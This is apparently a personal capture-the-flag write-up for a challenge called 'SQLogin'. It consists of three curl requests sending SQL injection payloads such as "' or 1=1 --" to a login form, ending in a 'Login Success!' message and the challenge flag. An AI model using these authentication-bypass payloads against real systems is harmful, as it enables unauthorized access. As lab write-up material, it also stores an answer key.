---
created: 2024-06-11T01:17
updated: 2024-06-11T01:29
---

# SQLogin

Seems like the usual SQL injection

## Try 1

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=admin" \
     --data-urlencode "pw=' or 1=1 --"
```

![](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718083749/2024/06/77ff3c96de112411090d43bcc2c3c6f0.png)

Hrmm

## Try 2

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=' or 1=1 --" \
     --data-urlencode "pw="
```

![](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718083749/2024/06/4c5ea675746c69118ca3c5b4c3730586.png)

## Try 3

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=' or 1 --" \
     --data-urlencode "pw="
```

![](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718083750/2024/06/e785ec99d6acc52091341ee433906d6c.png)

```text
Login Success!
Flag is CDDC22{Th1s_i5_51mp1e_SQL_inj3ct10n}
```

erm, was this supposed to happen?
